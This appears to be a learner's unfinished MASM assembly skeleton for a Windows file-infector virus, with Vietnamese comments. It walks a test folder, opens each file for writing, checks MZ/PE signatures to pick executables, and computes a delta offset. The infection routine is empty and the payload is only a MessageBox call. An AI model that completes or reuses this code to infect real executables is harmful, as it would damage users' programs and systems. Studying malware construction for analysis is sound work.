.386
.model flat, stdcall
.stack 100h
option casemap:none

include windows.inc
include kernel32.inc
include user32.inc

includelib kernel32.lib
includelib user32.lib

.data
    path db "C:\Users\LuongTD\Downloads\FileInfectorVirus\test\*.*",0 ;
    handle dd ?
    wfd WIN32_FIND_DATA <>
	handleFile dd ?
	pathNew db 100 dup (0)
	data db 100 dup (0)
	flagCheckExe db 0
	virtualAddress dd ?
.code
read proc number : dword ; ham doc byte voi so luong byte can doc truyen vao 
	push 0
	push 0
	push dword ptr [number]
	push offset data
	push dword ptr [handleFile]
	call ReadFile
	
	ret

read endp
checkFileExe proc ; ham kiem tra xem co phai la file thuc thi khong

	mov byte ptr [flagCheckExe] , 0 ; rerset lai flag check

	push 100 
	push offset pathNew
	call RtlZeroMemory ; reset lai vung luu tru path moi 
	
	mov ecx , 0	
newFileName: ;lay path cu truyen vao path moi
	cmp byte ptr [path + ecx] , 0
	je endNewfileName
	mov dl , byte ptr [path + ecx]
	mov byte ptr [pathNew + ecx] , dl
	inc ecx
	jmp  newFileName
endNewfileName: ; lay name file de ghi vao trong path moi
	sub ecx , 3
	mov ebx , 0
loop2: 
	cmp byte ptr [wfd.cFileName + ebx]	, 0
	je endLoop2
	mov dl , byte ptr [wfd.cFileName + ebx]
	mov byte ptr [pathNew + ecx] , dl
	inc ecx
	inc ebx
	jmp loop2
endLoop2:	;
	push 0
	push 128
	push 3
	push 0
	push 0
	push 0C0000000h
	push offset pathNew
	call CreateFile ; tien hanh mo file
	mov dword ptr [handleFile], eax
	
	push 100
	push offset data
	call RtlZeroMemory  ; reset lai noi luu data doc duoc
	
	push 2
	call read ; doc 2 byte dau la 2 buye chu ki MZ
	
	cmp word ptr [data] , 5A4Dh ; check xem co phai laf file MZ( file thuc thi hoac dll hay khong"
	jne endProc ; neu khong thi bo qua tuc la khong phai file thuc thi
	
	push 0
	push 0
	push 60
	push dword ptr [handleFile]
	call SetFilePointer ; di chuyen den byte doc ifanview
	
	push 4
	call read ; doc 4 file ifanview
	
	push 0
	push 0
	push dword ptr [data]
	push dword ptr [handleFile]
	call SetFilePointer ; di chuyen den vi tri FE header
	
	push 4
	call read ; doc 4 byte signature
	
	cmp dword ptr [data] , 4550h ; so sanh xem co phai la file FE hay kong
	jne endProc ; Neu khong phai thi bo qua 
	
	mov byte ptr [flagCheckExe] , 1 ; neu phai thi flag chuyen thanh true tuc la file thuc thi 
	
endProc:	
	ret

checkFileExe endp

ifectorFile proc	
	;;
endProcInfectorFile:
	ret

ifectorFile endp

main: ; Ham main 	
    push offset wfd
    push offset path
    call FindFirstFileA ; Duyet file dau tien trong thu muc
    cmp eax, -1 ; so sanh voi ma loi
    je endLoopFile ; Neu loi thi end program
    mov dword ptr [handle], eax ;;Neu thanh cong thi luu handle lai

loopFile:
	cmp byte ptr [wfd.cFileName] , "." ; so sanh xem co phai la folder hien tai hay khong
	je nextLoopFile ; neu la no thi no qua khong su li
	cmp byte ptr [wfd.cFileName + 1] , "." ; kiem tra xem co phair la folder cha hay khong 
	je nextLoopFile ; neu la folder cha thi bo qua
	
	call checkFileExe ; goi ham kiem tra xem co phai la file thuc thi hay khong
	cmp byte ptr [flagCheckExe] , 0 
	je nextLoopFile ; neu khong phai file thuc thi thi bo qua khong xu li
	;;;;;;;;;;
	;;logic file infector in here
	
	
	;;tien hanh su dung ki thuat delta de lay duoc dia chi that su file khi duoc chay tren bo nho  
	call Delta
Delta:
	pop ebp ; Sau khi call thi windows loader se tien hanh day dia chi thuc su cua label Delta vao trong stack
	; Tuc la ta da lay duoc dia chi that su khi chay trong bo nho cua label Detal nay 
	;offset se lay duoc gia tri ao tuong doi tinh tu imagesbase 
	sub ebp , offset Delta ; Tuc la cau lenh nay se lay dia chi that su tren bo nho tru dia dia chi ao tuong doi va tinh duoc dia chi that su cua chuong trinh tren bo nho
	;; Tai sao lai khong dung imagebase vi no la dia chi windows loader uu tien khi tai len bo nho thoi nhung co the no se tai len dia chi khac khi dia chia uu tien da duoc su dung  
	mov dword ptr [virtualAddress] , ebp ; Luu lai dung sau 
	
	
	call ifectorFile 
	;;end
	;;;;;;;;;
nextLoopFile:
    push offset wfd
    push dword ptr [handle]
    call FindNextFileA ; Lap tung file
    cmp eax, 0 ; neu loi 
    jne loopFile ; Neu khong loi thi tiep tuc duyet file

endLoopFile: ; end chuong trinhf
    push 0 
    call ExitProcess 
    
payload :
	push 0
	push 0
	push 0
	push 0
	call MessageBox
    
end main
